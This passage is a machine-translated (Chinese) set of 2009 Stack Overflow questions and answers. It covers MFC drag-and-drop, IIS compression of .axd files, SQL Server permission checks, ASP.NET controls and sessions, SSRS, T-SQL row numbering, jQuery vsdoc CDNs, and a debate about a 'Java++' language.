谷歌搜索后`OnDropFiles`，我发现它是从`CWnd`类继承的：[（MSDN page）](http://msdn.microsoft.com/en-us/library/62zys01d(VS.80).aspx)

* * *

根据该 MSDN 文章：

**参数**
`hDropInfo`

> 指向描述已删除文件的内部数据结构的指针。此句柄由`DragFinish`、`DragQueryFile`和`DragQueryPoint`Windows 函数用于检索有关已删除文件的信息。

稍后引用：

> “当用户在一个已将自己注册为被删除文件的接收者的窗口上释放鼠标左键时，框架调用此成员函数。
> 
> “通常，派生类将被设计为支持删除的文件，并且它将在窗口构建期间注册自己。
> 
> 该成员函数由框架调用以允许您的应用程序处理 Windows 消息。传递给您的函数的参数反映了框架在收到消息时收到的参数。如果您调用此函数的基类实现，该实现将使用最初随消息传递的参数，而不是您提供给函数的参数。”

* * *

这*似乎*表明在注册该功能之前，它不会“按预期”工作。

因此，我相信正在发生的事情是，当您第一次将某些内容放到 CHTMLView 上时，它会自行注册，然后才会***“***按预期工作”。

如果我的理解是正确的，那么就提出了一个新的问题，就是如何强制注册View。从 MSDN 技术说明上的相关链接，您可以强制`DragAcceptFiles` [（请参阅此处）](http://msdn.microsoft.com/en-us/library/bb776406(VS.85).aspx)运行，否则会在 drop 事件完成时触发。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-01-29T16:54:26.477

我推荐的是切换到[HTMLayout——](http://www.terrainformatica.com/htmlayout/main.whtm)它比 CHtmlView 好得多。

# asp.net - 是否可以为 IIS 的 HTTP 压缩添加 axd 扩展名？

> ID：484143
> 
> 赞同：6
> 
> 时间：2009-01-27T16:40:07.683
> 
> 标签：asp.net, iis-6, compression, gzip, webresource.axd

我为以下类型的文件启用了 IIS 6 的内置 HTTP 压缩：

```
 HcFileExtensions="htm
        html
        txt
        css
        js"

    HcScriptFileExtensions="asp
        dll
        exe
        aspx
        asmx
        ascx" 
```

但是，我不清楚添加 axd 扩展名是否合适，以便压缩我的 WebResource.axd 文件。

最后，对于我可能错过的 asp.net 2.0 站点，还有其他明显的扩展吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-28T14:02:40.513

本文说使用 web 资源[axd](http://www.rosshawkins.net/archive/2006/10/08/webresource.axd.aspx)扩展进行压缩存在潜在问题。作者建议将此扩展*排除*在任何压缩之外。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-28T15:28:20.397

我在 IIS 6.0 上运行了一个 ASP.NET 2.0 应用程序，并将 .axd 添加到 HcScriptFileExtensions 列表中，而在过去几个月中它没有引起任何明显的问题。

但是，默认情况下，当用户代理指示 IE6 时，ScriptManager 不会压缩 ScriptResource.axd，但通过此设置，IE6 用户仍将获得压缩版本。您可能不希望这种行为。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-06-18T09:07:30.347

实际上，既然您提到了这个话题：压缩 CSS 也可能是一个问题 - IE 6 在提供压缩 CSS 时可能会崩溃。

不幸的是，我没有任何链接来支持这个声明，这只是我从我们的开发负责人那里听到的。

由于与呈现的 html 相比，CSS 通常有点小，所以我总是省略压缩 CSS - 以防万一。

编辑：刚刚偶然发现 MS 的一个链接提到了这个问题 - 它还提到 js 作为一个潜在问题：http: [//support.microsoft.com/kb/825057](http://support.microsoft.com/kb/825057)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-08-19T19:57:46.377

我只想就我到目前为止所做的工作提供一些反馈。我还没有尝试过 Blowery，因为我想探索在 iis 6 中使用 HttpCompression 来看看它是如何进行的，或者最初它是否适用于 .axd 文件。为了测试我页面上的压缩统计信息，我使用了名为 YSlow 的 Firefox 雅虎插件。在我看来，这个插件非常直观且非常有用。

所以我已经在 windows server 2003 上打开了 iis6 httpcompression，为 css、js 和 aspx 文件等配置压缩，然后使用 YSlow 建立了正在/没有被压缩的文件。不用说 webResource.axd 文件没有被压缩，但其他文件被压缩了。

然后我更改了 iis metabase.xml 文件以在 HcScriptFileExtensions 属性中包含文件扩展名 axd。在我重新启动 iis 后，来自 YSlow 的测试结果现在显示所有 webResource.axd 文件都被压缩了。我仍在测试检查所有客户端内容是否按预期工作的功能，但到目前为止没有任何问题。我希望这对其他人有帮助

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-06-08T01:03:54.277

您没有为 HttpHandlers 列出 ashx 扩展。我见过很多库使用它来输出 javascript。

# sql - MS SQL Server：检查用户是否可以执行存储过程

> ID：484145
> 
> 赞同：9
> 
> 时间：2009-01-27T16:40:25.123
> 
> 标签：sql, sql-server, sql-server-2005, tsql, stored-procedures

如何检查用户是否可以在 MS SQL 服务器中执行存储过程？

我可以通过连接到主数据库并执行以下操作来查看用户是否具有显式执行权限：

```
databasename..sp_helpprotect 'storedProcedureName', 'username' 
```

但是，如果用户是具有执行权限的角色的成员 sp_helprotect 不会帮助我。

理想情况下，我希望能够调用类似的东西

```
databasename..sp_canexecute 'storedProcedureName', 'username' 
```

这将返回一个布尔值。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-01-27T16:43:57.847

[`fn_my_permissions`](http://msdn.microsoft.com/en-us/library/ms176097.aspx)和[`HAS_PERMS_BY_NAME`](http://msdn.microsoft.com/en-us/library/ms189802.aspx)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-27T20:56:19.867

尝试这样的事情：

```
CREATE PROCEDURE [dbo].[sp_canexecute]
@procedure_name varchar(255),
@username varchar(255),
@has_execute_permissions bit OUTPUT
AS

IF EXISTS (
        /* Explicit permission */
        SELECT 1
        FROM sys.database_permissions p
        INNER JOIN sys.all_objects o ON p.major_id = o.[object_id] AND o.[name] = @procedure_name
        INNER JOIN sys.database_principals dp ON p.grantee_principal_id = dp.principal_id AND dp.[name] = @username
    )
    OR EXISTS (
        /* Role-based permission */
        SELECT 1
        FROM sys.database_permissions p
        INNER JOIN sys.all_objects o ON p.major_id = o.[object_id]
        INNER JOIN sys.database_principals dp ON p.grantee_principal_id = dp.principal_id AND o.[name] = @procedure_name
        INNER JOIN sys.database_role_members drm ON dp.principal_id = drm.role_principal_id
        INNER JOIN sys.database_principals dp2 ON drm.member_principal_id = dp2.principal_id AND dp2.[name] = @username
    )
BEGIN
    SET @has_execute_permissions = 1
END
ELSE
BEGIN
    SET @has_execute_permissions = 0
END
GO 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T19:06:41.320

假设 SP 只运行一个 SELECT 语句：

> EXECUTE AS USER = [用户 ID/登录名]
> EXEC sp_foobar(sna, fu)
> REVERT

请务必注意，您需要在提示符后运行 REVERT 命令，因为 SQL Server 会将您视为您正在执行的用户，直到您关闭连接或 REVERT 模拟。也就是说，您应该确切地看到用户会得到什么（得到一些行但不是全部？这应该对您有所帮助）。

# asp.net - 当页面验证失败时，如何禁用我的 ASP.NET AJAX ConfirmButtonExtender？

> ID：484152
> 
> 赞同：3
> 
> 时间：2009-01-27T16:41:50.817
> 
> 标签：asp.net, javascript, asp.net-ajax, validationsummary, confirmbutton

我有一个使用 Microsoft 的[ConfirmButton](http://www.asp.net/AJAX/AjaxControlToolkit/Samples/ConfirmButton/ConfirmButton.aspx)扩展器的提交按钮来询问“你确定吗？”。但是，无论页面是否通过客户端验证，它都会触发。

```
<asp:TextBox ID="TextBox1" runat="server" />
<asp:RequiredFieldValidator ID="RequiredFieldValidatorTextBox1"
    runat="server"
    ControlToValidate="TextBox1"
    ErrorMessage="First name is required"
    Display="Dynamic" />
...
<asp:Button ID="Button1"
    runat="server"
    Text="Submit"
    CausesValidation="True" />
<ajaxToolkit:ConfirmButtonExtender ID="ConfirmButtonExtenderButton1"
    runat="server"
    TargetControlID="Button1"
    ConfirmText="Are you sure?" />
...
<asp:ValidationSummary id="ValidationSummary1"
    runat="server"
    ShowMessageBox="True" /> 
```

因此，如果用户将必填字段留空并单击“提交”按钮。她会看到两个消息框：

一个用于验证...

[ValidationSummary ShowMessageBox http://img120.imageshack.us/img120/8305/validationzn6.gif](http://img120.imageshack.us/img120/8305/validationzn6.gif)

然后一个确认...

[ConfirmButtonExtender http://img228.imageshack.us/img228/678/confirmationam3.gif](http://img228.imageshack.us/img228/678/confirmationam3.gif)

（注意：OK 和 Cancel 都只是取消。）

如果验证失败，显示确认是没有意义的。它应该是其中之一。我怎样才能做到这一点？

* * *

更新：

如果我尝试使用 ConfirmOnFormSubmit，则会收到以下警告：

> 验证 (ASP.Net)：属性“ConfirmOnFormSubmit”不是元素“ConfirmButtonExtender”的有效属性。

[验证 (ASP.Net)：属性“ConfirmOnFormSubmit”不是元素“ConfirmButtonExtender”的有效属性。http://img382.imageshack.us/img382/1391/confirmonformsubmitow3.gif](http://img382.imageshack.us/img382/1391/confirmonformsubmitow3.gif)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T19:13:31.023

确保 ConfirmOnFormSubmit 在 ConfirmButtonExtender 上设置为 TRUE。

从[示例网站](http://www.asp.net/AJAX/AjaxControlToolkit/Samples/ConfirmButton/ConfirmButton.aspx)：

*ConfirmOnFormSubmit - 如果确认对话框应该等到表单提交显示之前，则为真。这在使用 ASP.NET 验证器时很有用，并且只有在所有验证器都通过后才应显示确认。*

编辑：根据该网站，它是有效的。尝试[更新到最新版本](http://www.codeplex.com/AjaxControlToolkit/Release/ProjectReleases.aspx?ReleaseId=16488)，或者忽略智能感知，看看你发布它时会发生什么。

# c# - Visual Studio 起始页上的默认新闻源（C# 配置文件）

> ID：484159
> 
> 赞同：1
> 
> 时间：2009-01-27T16:43:34.493
> 
> 标签：c#, visual-studio

每当我安装 Visual Studio 2005 或 2008 并选择 C# 配置文件时，起始页的“新闻”部分默认为“ [http://go.microsoft.com/fwlink/?linkid=45192&clcid=409](http://go.microsoft.com/fwlink/?linkid=45192&clcid=409) ”。

我喜欢起始页，喜欢引用它，喜欢提供的默认 MSDN C# 新闻提要的内容（那里有很多好东西），但提要自 2008 年 3 月以来一直没有更新。

**是否有更新的 MSDN C# 新闻提要？**这个标题是“MSDN：Visual C#”，副标题是“Visual C# 开发人员的最新信息”，这让我认为它是适当的“官方”MS C# 新闻提要。**或者，这只是 MS 提供的一个虚拟提要，开发人员应该使用他们喜欢的提要自定义他们的 VS 起始页面？**我这样做没有问题 - 我只是认为提供的那个看起来很有希望（如果它是最新的）。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-12-23T15:37:55.590

所以我现在意识到这是一条古老的线索，但我偶然发现它正在寻找同样的东西。我最近在第二台机器上安装了 VS2008，并且它使用的 URL*已经*更新（最近 12/08/2009，并且是：

[http://go.microsoft.com/fwlink/?linkid=84795&clcid=409](http://go.microsoft.com/fwlink/?linkid=84795&clcid=409)

干杯!

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-27T17:07:00.127

我只会将提要更改为适合您的任何内容，以及您最感兴趣的内容。有几个站点可以[将多个提要合并为一个](http://ask.metafilter.com/16678/Combine-RSS-feeds-into-new-feed)，这也可能是一个不错的选择。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-28T01:29:03.340

您可以尝试 Microsoft C# Teams 博客之一 - [http://msdn.microsoft.com/en-us/vcsharp/aa336723.aspx](http://msdn.microsoft.com/en-us/vcsharp/aa336723.aspx)

# sql-server - SSRS中具有相同参数的两个数据集

> ID：484162
> 
> 赞同：1
> 
> 时间：2009-01-27T16:44:00.890
> 
> 标签：sql-server, reporting-services, dataset

我正在尝试在我的 SSRS 报告中创建两个表。我使用了 2 个具有相同参数的不同包来创建数据集。在执行 dataset2（从设计器中的数据选项卡手动）时，它工作正常并给我现场结果。但是，在从报表执行（单击查看报表）时，使用 dataset2 的第二个表没有返回任何内容，而第一个表则返回。为什么会有这种行为。请给我一个想法。

在此先感谢爵士

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T16:53:45.753

我过去做过同样的事情，但它一直有效。您的参数名称是否相同且字段类型相同？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T18:58:53.910

看：
1）尝试刷新参数中的字段（出于某种奇怪的原因，有时运行查询不会刷新我的字段/参数）
2）确保您获得相同的参数。SSRS 喜欢采用两个都有 @reportDate 参数的数据集，并给其中一个参数！ReportDate 和另一个参数！ReportDate_1
3）正如 Eppz 所指出的，它们都是相同的数据类型吗？

# sql - TSQL：如何将字符添加到选择语句

> ID：484165
> 
> 赞同：2
> 
> 时间：2009-01-27T16:45:18.157
> 
> 标签：sql, sql-server, tsql, sql-server-2000, row-number

我有以下声明

```
SELECT id, descr from mytable 
```

返回

1、'Test1'
4、'Test4'
6、'Test6'
8、'Test8'
22、'Test22'

现在我希望显示在前 4 个结果中添加一个连续字符...

'A', 1, 'Test1'
'B', 4, 'Test4'
'C', 6, 'Test6'
'D', 8, 'Test8'
'',22, 'Test22'

想法？

编辑：如果可能，希望使用 SQL Server 2000 示例。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-27T16:48:53.453

```
SELECT CASE WHEN ROWNUMBER < 4
           THEN CHAR(65 + ROWNUMBER - 1)
           ELSE ''
       AS <WHATEVER>
       ,X.id
       ,X.descr
FROM (
    SELECT ROW_NUMBER() OVER (ORDER BY <WHATEVER>) AS ROWNUMBER
        ,id
        ,descr
    FROM mytable
) AS X 
```

这在 SQL Server 2005 及更高版本中。

在 SQL Server 2000 中（假设 id 是您的排序顺序并且是唯一的）：

```
SELECT CASE WHEN rownumbers.rownumber < 4
           THEN CHAR(65 + rownumbers.rownumber - 1)
           ELSE ''
       AS <WHATEVER>
       ,mytable.id
       ,mytable.descr
FROM (
    SELECT l.id, COUNT(*) AS rownumber
    FROM mytable AS l
    LEFT JOIN mytable AS r
        ON l.id >= r.id
    GROUP BY l.id
) AS rownumbers
INNER JOIN mytable
    ON mytable.id = rownumbers.id 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T17:15:05.740

您不能在 SQL Server 2000 中的单个 select 语句中执行此操作。SQL Server 2000 没有 ROWNUM 语句。

如果要使用临时表，可以使用 IDENTITY 函数来完成。

```
SELECT IDENTITY(int,1,1) rownum, 
       id, 
       descr 
INTO #mytable 
from mytable

SELECT CASE WHEN ROWNUMBER < 4
       THEN CHAR(65 + ROWNUMBER - 1)
       ELSE ''
   AS <WHATEVER>
   ,X.id
   ,X.descr
FROM #mytable X
ORDER BY rownum 
```

注意： IDENTITY 函数只能在 SELECT INTO 语句中使用。

# jquery - 带有 vsdoc 的 jQuery CDN 主机？

> ID：484169
> 
> 赞同：9
> 
> 时间：2009-01-27T16:45:55.223
> 
> 标签：jquery, cdn

继[这个问题](https://stackoverflow.com/questions/482358/conditionally-selecting-a-version-of-jquery-depending-on-environment)（我问过）和[这个问题](https://stackoverflow.com/questions/482308/hosted-microsoft-ajax-on-cdn)（西蒙问过）之后，是否有一个 CDN 可以并排提供 jQuery 脚本和 -vsdoc 版本？

例如谷歌提供：

```
http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.min.js 
```

但不提供

```
http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.min-vsdoc.js 
```

微软有 jQuery 的 CDN 吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-09-16T14:50:01.243

是的，Microsoft 有一个 CDN，它同时托管 jQuery 和用于 jQuery 的 vsdoc Intellisense。[您可以在http://www.asp.net/ajax/cdn/](http://www.asp.net/ajax/cdn/)了解更多信息

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2011-03-12T17:39:11.360

Guy & Juri——在 VS2010 中，这可以让 jQuery Intellisense 脱离 MS CDN：

```
<script>
/// <reference path="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.5-vsdoc.js"/>
</script> 
```

只需将其粘贴到 .aspx 页面中的 <head/> 中，它就可以工作了。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2010-03-16T05:06:24.490

**更新：** jQuery 现在还在 CDN 上托管代码，这包括 VSDOC 版本。这些链接可从 jQuery 下载页面获得。

例如[http://code.jquery.com/jquery-1.4.1-vsdoc.js](http://code.jquery.com/jquery-1.4.1-vsdoc.js)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-27T17:13:58.177

不，我不相信有任何像这样重要的 CDN。但是，请参阅[我](https://stackoverflow.com/questions/482358/conditionally-selecting-a-version-of-jquery-depending-on-environment#484276)对您的其他问题的回答，了解引用 vsdoc 文件的简单解决方法。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-12-18T10:18:34.020

请注意，在 Microsoft CDN 上，jquery-1.3.2-vsdoc.js 和 jquery-1.3.2.min-vsdoc.js 文件大小相同。避免使用 min-vsdoc 版本——它根本没有被缩小，所以这个名字有误导性。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2010-03-16T05:11:58.933

您不需要链接到传统意义上的文件。下载 vsdoc 文件并将其放在 JS 文件的顶部（假设 vsdoc 与 JS 文件位于同一文件夹中）：

```
/// <reference path="jquery-1.4.1-vsdoc.js" /> 
```

# asp.net - 获取所有执行函数的列表，如 asp.net 中的调用堆栈

> ID：484170
> 
> 赞同：0
> 
> 时间：2009-01-27T16:46:04.707
> 
> 标签：asp.net, debugging, session, stack-trace

我在调试我们网站中遇到的问题之一时遇到了麻烦。这就是问题。我有一个网页，其中包含员工的照片和与员工相关的信息。当用户登录我们的网站时，我们会在会话中存储员工的详细信息。我正在为员工照片设置图片网址，如下所示。

```
imgEEPhoto.ImageUrl = imgPhoto.aspx?Company=XXXX&Empno=YYYY. 
```

在页面 imgPhoto.aspx 中，我正在检查该用户的会话是否处于活动状态。当我登录到有员工照片的页面时，有时照片不会显示。这是因为我正在检查 imgPhoto.aspx 页面中的会话是否处于活动状态。有时会话是活动的，有时会话是不活动的。看起来有一些函数将会话异步设置为空。我不知道如何跟踪该功能。所以我在想，在 imgPhoto.aspx 页面中，如果我可以获得到目前为止已执行的所有函数的列表，我可以跟踪正在重置会话的函数。有没有办法找到这个？

如果没有其他方法可以调试此问题，请告诉我。

**编辑：**

页面 imgPhoto.aspx 获取 company 和 empno 作为查询字符串参数。然后页面根据 company 和 empno 获取二进制数据，并使用 Response.BinaryWrite() 显示照片。会话检查位于此函数的开头。所以在调用这个函数之前的某个地方，在主页中的所有函数结束之后，会话就会超时。实际上我不确定它是否超时，因为我可以打印 sessionid。但我无法访问存储在会话中的变量。

如果我在函数内部打印调用堆栈，它会给出在该页面内执行的函数列表。它没有给出在该函数之前执行的所有函数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-27T17:12:46.697

.NET 中没有内置工具来列出所有调用的函数，尽管您可以在特定点打印调用堆栈（就像异常一样）。

如果这是您想要采取的路线，我建议您寻找代码覆盖率分析器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T17:25:13.473

如果我理解这个问题，imgphoto.aspx 正在构建一个包含 url 的字符串，然后将其发回，对吗？如果是这样，如果您修改了 imgPhoto.aspx 以始终返回您知道肯定存在的图像的硬编码 URL，您还有问题吗？

我想首先排除您不是无意中发回了格式错误的 url 或不存在的照片的 url。我先试试这个，不检查会话，如果你不能重现问题（即总是有效），然后添加会话检查并仍然发回一个静态 url，看看问题是否可以通过这种方式复制.

我总是首先尝试排除“简单”的事情——也许你已经这样做了？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T17:38:15.197

听起来好像您的问题是间歇性的，也许您的会话状态正在超时？您可以在 Gloabal.asax 文件的 Session_End 方法中记录会话何时结束，以准确了解会话何时终止。您可以尝试增加会话超时（默认为 20 分钟）分辨率，如下所示：

Timeout 属性可以在 Web.config 文件中设置

```
<SessionState timeout = "30" /> 
```

或者，您可以使用应用程序代码直接设置 Timeout 属性值

```
Session.Timeout = 30 
```

# java - 我们需要Java++吗？

> ID：484172
> 
> 赞同：16
> 
> 时间：2009-01-27T16:46:21.057
> 
> 标签：java, c++, programming-languages, language-design, innovation

在我看来，在某些方面，Java 是 C 很久以前的地方。两者在当时都是相当简约的语言，具有相对干净、简单的核心构建。（我指的是这里的核心语言，**而不是**库。）两者都非常流行。两者都是/曾经是通用语，具有大量遗留代码。两者都缺乏其他语言的程序员经常错过的几个现代生产力功能。两者似乎都非常惯性主导，并且适应不断变化的世界的速度很慢。

在我看来，创建一个大致是 Java 超集的 Java++ 是合理的，就像 C++ 之于 C 一样。这种语言会试图让 Java 摆脱它所经历的相对停滞，只在少数情况下破坏向后兼容性仅在绝对必要的情况下使用次要方法，添加许多普通旧 Java 所缺少的现代特性，并担心以后的标准化。可能是个好主意的功能包括：

1.  一流的功能，代表。
2.  关闭。
3.  静态类型推断，类似于`var`C# 或`auto`D 中的类型。
4.  运算符重载。
5.  结构体作为不同于类的值类型，如 C# 和 D。
6.  特性。
7.  忽略检查异常的选项。
8.  在一个文件中声明多个顶级公共类的能力。
9.  更强大的内置数组，允许追加之类的东西。
10.  更好的泛型/真实模板。
11.  类似于 C# 4.0 的动态关键字，它允许在必要时以一般静态语言进行鸭式输入。
12.  由于 Java 主要是一种 VM 语言，因此可能有一些核心元编程功能，例如为某些事情动态生成代码。

你认为这种语言会有需求吗？你认为这样的事情会成功吗？

编辑：我不是在谈论运行时/字节码级别的兼容性，而是在**源代码**级别谈论与 Java 的兼容性。此外，是的，Java 7 可以添加其中的一些，但似乎为 Java 添加功能的“官方”过程非常保守。真正的重点是将Java分叉成一个分支的想法，重点是创新而不是稳定性/标准化。

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2009-01-27T16:48:01.850

比如，[Scala](http://www.scala-lang.org/)或更好的 Groovy，它自称是 java 的动态版本？

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2009-01-27T18:14:14.437

Java 粉丝对此会否决，但作为同时编写 Java 和 C# 的人，我会说 C# 与 Java ++ 一样接近。

C 到 C++ 是一个范式转变，从面向过程到面向对象，他们保留这个名称的唯一原因是吸引 C 程序员认为它是导致大量伪装成 C++ 的非常糟糕的 C 代码负载的同一语言。

Java 不断扩展，Sun 正在迅速整合越来越多的功能，因此 Java 7 或 8 很可能是您的 Java ++

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2009-01-27T17:48:50.010

我认为“*我们需要 Java++ 吗？* ”的答案取决于“*我们*”是谁（我不确定“*我们*”是否都是一个类的实例 ;-)。[Java Posse](http://www.javaposse.com/)不止一次讨论过这个问题。

Java 的大型企业用户倾向于更加保守。他们有大量的开发人员和大量的现有代码。因此，对语言或库的更改（培训、维护、现有代码的破坏等）存在很高的感知成本和风险。

另一方面，有许多小型的、轻率的开发团队（开源或其他）随时准备抓住编程中的下一个好主意。我不清楚一个答案是否会让每个人都足够满意。

我建议不断增长的基于 JVM 的语言生态系统可能有助于解决这种紧张局势。如果较新的语言（Scala、Fan、JRuby、JavaFxScript 等）提供第二组所需的符号特性（和新颖性），同时保持与现有 Java 的互操作性（可以以更稳定的速度移动），也许这两个组都可以有他们选择的蛋糕口味。

我对某些人似乎想要一种真正的语言的程度感到有些困惑。在过去，很常见的说法是每种语言（符号）都有一个适用的“甜蜜点”。有时正确的解决方案是用适当的语言编写系统的每个部分并将它们链接在一起。

回到未来，有人吗？

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2009-01-27T19:32:58.910

问题实际上是您如何决定“下一种语言”的内容。只是零碎地添加/删除功能会导致一堆废话。最好考虑一下这些功能的添加或删除（通常结合使用）如何根据新原则改变您的编程方式。例如，我认为有趣的是，Java 闭包提案在许多方面都因必须在没有丰富类型推断的情况下处理静态类型而受到影响。有大量具有漂亮闭包的动态语言示例-它们很好地结合在一起。Scala 和其他语言已经表明，静态类型加上丰富的类型推断也可以使闭包变得漂亮。我的观点是，采用语言 X 并制作语言 X++ 可能并不那么有趣。它'

现在肯定没有什么可以阻止您分叉 Java 并将其变成您想要的任何东西（只要您不称它为 Java 或想要通过测试套件）。如上所述，现在已经有一组令人兴奋的高质量语言可以做到这一点并保持与 Java 的互操作性。我主要考虑的是 Groovy、Scala、Clojure 和 Fan，而不是像 JRuby、Jython 和 Rhino 这样的 JVM 先前语言的端口，这些语言在实现干净的 Java 集成时往往更具挑战性。

[Java 7](http://tech.puredanger.com/java7)中的 JVM 中的[JSR 292 特性](http://tech.puredanger.com/java7#invokedynamic)很可能会在已经非常出色的 JVM 基础上为语言开发提供更丰富的平台。CLR+DLR 也在推动许多有趣的界限。

越来越多的，我认为未来将倾向于为工作选择正确的语言。这要么发生在具有混合传统的语言中（例如 Scala 是 FP / OO 的一个很好的例子），要么发生在促进多种语言之间干净集成的虚拟机（JVM、CLR、BEAM、Parrot 等）中。或者最有可能的是，两者兼而有之。我认为我们不会倾向于任何一种衍生自 Java（或其他任何东西）的 Next Big Language。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-01-27T20:20:24.183

目前在 Java 中，有许多解决方法，这确实使得引入更自然的方法来做这些事情变得更加困难。

> 1.  一流的功能，代表。

大多数情况下使用反射会更短。（但不太自然）

> .4\. 结构体作为不同于类的值类型，如 C# 和 D。

我会同意这一点。

> .5\. 特性。

现在可以做到这一点，但需要付出一些努力。适当的内置支持会更好。

> .6\. 忽略检查异常的选项。

你现在可以这样做，但它是一个黑客。注意：检查异常是编译时功能。

我相当怀疑这是否真的是一个好主意，除非人们真正理解异常。通常提出这个建议的人不喜欢被迫考虑错误情况、记录或处理它们。

> .7\. 在一个文件中声明多个类的能力。

你现在可以这样做了。只是不超过一个顶级公共课程。

> .8\. 更强大的内置数组，允许追加之类的东西。

请参阅公共 ArrayUtils。一个具有健全 toString() 的数组将被启动。

> .9\. 更好的泛型/真实模板。

我同意，这取决于你的意思。我认为他们应该先让当前的实施工作，然后再改进它。例如，Java API 可以在没有未经检查的警告的情况下编译。

> .10\. 类似于 C# 4.0 的动态关键字，它允许在必要时以一般静态语言进行鸭式输入。

同样，反射可以做到这一点，但它相对难看。

> .11\. 由于 Java 主要是一种 VM 语言，因此可能有一些核心元编程功能，例如为某些事情动态生成代码。

像 JavaCompiler（在 java 6 中）、脚本支持（在 java 6 中）、JCI 或 BeanShell。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-01-27T16:56:53.530

如果你要做出重大改变，你不想重新开始吗？在 Java 中修复/删除可以做很多事情。你不能单独考虑特性——它们确实以意想不到的方式交互。一种大而复杂的语言可能是一种糟糕的语言（参见 C++）。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2010-01-12T04:51:51.200

[Java++](http://www.scala-lang.org/)已经在这里了... :D

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2009-01-27T17:57:36.730

那些东西大多是绒毛。

您需要解决一些更大的问题，例如使并发代码易于设计和推理。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2009-01-27T18:04:08.543

大多数功能已经存在。

该语言是：

[![时髦的](https://i.stack.imgur.com/dJcZg.png)](https://web.archive.org/web/20150324062712/http://groovy.codehaus.org:80/)
[（来源：[codehaus.org](http://media.xircles.codehaus.org/_projects/groovy/_logos/medium.png)）]

=

至于：

> *在一个文件中声明多个类的能力。*

它从一开始就存在于java中。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2011-02-20T13:59:19.337

这些似乎都是相当“肤浅”的语言变化，主要是出于开发者的便利性，而不是从根本上**改变了语言哲学**。

在我看来，对语法的细微调整**并不能证明**大规模转向新语言的合理性，特别是如果这意味着放弃对平台、代码库和开发人员技能集的大量投资。

如果有足够的需求，可以随着时间的推移（在 Java 7、8、9...中）将微小的更改添加到 Java 语言中。然而，关于它们是否合理存在一个真正的问题，因为像这样的变化会使语言变得更加复杂，因此随着不同的开发人员开始使用不同的特性子集，学习和维护代码库变得更加困难。

以 C++ 为例：理论上它是一种了不起的语言，允许您在任何可能的抽象级别进行编程，同时仍然允许优化代码中的机器代码级别的性能。在实践中，所有这些语言功能的复杂性意味着很少有人能够希望了解真正发生的事情，并且大型代码库变得几乎无法维护。

在我看来，唯一可以证明大规模“Java++”合理的变化将是根本性的范式转变，它会改变您更好地开发软件的方式。在我看来，使 Java 取得成功的根本变化（在 1995-2000 年超过了 C++ 等）：

*   在可移植、标准、跨平台运行时环境 (JVM/JRE) 中执行字节码，无需重新编译
*   一个大型、健壮的标准类库（包括线程、网络、GUI 等）——即认识到平台不仅仅是语言
*   强制收集垃圾

下一阶段基本转变的例子是：

*   抛弃面向对象，转而使用[函数式编程](http://en.wikipedia.org/wiki/Functional_programming)
*   消除锁定以支持[软件事务内存](http://en.wikipedia.org/wiki/Software_transactional_memory)，从而为大规模多核架构实现高性能、线程安全的并发
*   [用整个语言和类库中的不可变值](http://en.wikipedia.org/wiki/Immutable_object)替换可变变量（以便推理并发状态）
*   将编译时宏元编程作为通用解决方案来满足任何向语言添加新语法或创建 DSL 的需求

哦，是的，有一种 JVM 语言可以完成所有这些工作 - [Clojure](http://clojure.org/)

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2009-01-27T16:50:55.320

Sun 所做的这种努力难道不应该简单地称为 Java 7（或 1.7 或 2.0）吗？其他人/团体的这种努力不会被称为Java以外的东西吗？

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2009-01-27T17:04:25.683

如果您将这些结构的支持添加到 JVM（在必要时，例如闭包），然后在书面语言和编译器中创建必要的语法糖。当然，如果您希望保持向后兼容性，那么您需要做出设计决策，这就是 Java 泛型没有达到应有的水平的原因。我认为你会想要摆脱这种束缚以获得更完美的 Java，但需求会很少，因为兼容性就是它的所在。

而7可以直接走。我们在这里没有遇到软盘上的 FAT12 文件限制。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2009-01-27T19:04:54.677

随着 java 正在成为开源，*您*可以获取源代码（如果全部可用）并制作您自己的 java 版本。如果这得到广泛采用，那就太好了，如果没有，那么它可能不需要一组功能。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2009-01-27T19:30:37.543

